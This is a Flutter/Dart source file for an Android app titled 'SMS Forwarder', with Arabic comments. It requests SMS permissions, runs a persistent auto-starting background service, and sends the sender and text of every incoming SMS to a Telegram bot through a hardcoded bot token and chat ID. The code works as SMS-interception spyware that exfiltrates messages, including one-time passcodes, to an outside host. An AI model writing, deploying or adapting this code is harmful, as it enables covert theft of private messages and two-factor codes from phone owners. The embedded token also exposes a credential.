import 'dart:async';
import 'package:flutter/material.dart';
import 'package:another_telephony/telephony.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';

const String TELEGRAM_TOKEN = '8427135968:AAElq23WG9wdwRz376fcXGe-5zl4ujtTWw8';
const String CHAT_ID = '8427135968';

Future<void> sendToTelegram(String message) async {
  try {
    await http.post(
      Uri.parse('https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage'),
      body: {'chat_id': CHAT_ID, 'text': message},
    );
  } catch (e) {
    debugPrint('Telegram error: $e');
  }
}

// هذه تُستدعى لما يجي SMS والتطبيق مغلق كلياً
@pragma('vm:entry-point')
void backgroundSmsHandler(SmsMessage message) async {
  await sendToTelegram('📱 SMS\nمن: ${message.address}\n${message.body}');
}

// هذه هي الـ background service — تشتغل دائماً
@pragma('vm:entry-point')
void onServiceStart(ServiceInstance service) async {
  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
    service.setForegroundNotificationInfo(
      title: 'SMS Forwarder',
      content: 'يراقب الرسائل...',
    );
  }

  final telephony = Telephony.instance;

  telephony.listenIncomingSms(
    onNewMessage: (SmsMessage message) async {
      await sendToTelegram('📱 SMS\nمن: ${message.address}\n${message.body}');
    },
    onBackgroundMessage: backgroundSmsHandler,
  );

  // يبقى حياً — ping كل 5 ثواني
  Timer.periodic(const Duration(seconds: 5), (_) {
    debugPrint('service alive');
  });
}

Future<void> initBackgroundService() async {
  final service = FlutterBackgroundService();

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onServiceStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'sms_forwarder_channel',
      initialNotificationTitle: 'SMS Forwarder',
      initialNotificationContent: 'يعمل في الخلفية...',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(autoStart: false),
  );

  await service.startService();
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // طلب صلاحيات SMS
  final telephony = Telephony.instance;
  await telephony.requestPhoneAndSmsPermissions;

  // تشغيل الخدمة
  await initBackgroundService();

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: const Color(0xFF1E1E2E),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.sms, size: 80, color: Colors.greenAccent),
              const SizedBox(height: 20),
              const Text('SMS Forwarder',
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: 24,
                      fontWeight: FontWeight.bold)),
              const SizedBox(height: 8),
              const Text('يعمل في الخلفية ✓',
                  style: TextStyle(color: Colors.white54, fontSize: 16)),
              const SizedBox(height: 40),
              ElevatedButton.icon(
                onPressed: () async {
                  await sendToTelegram('✅ اختبار - يعمل!');
                  if (context.mounted) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(content: Text('تم الإرسال!')),
                    );
                  }
                },
                icon: const Icon(Icons.send),
                label: const Text('إرسال اختبار'),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.greenAccent,
                  foregroundColor: Colors.black,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}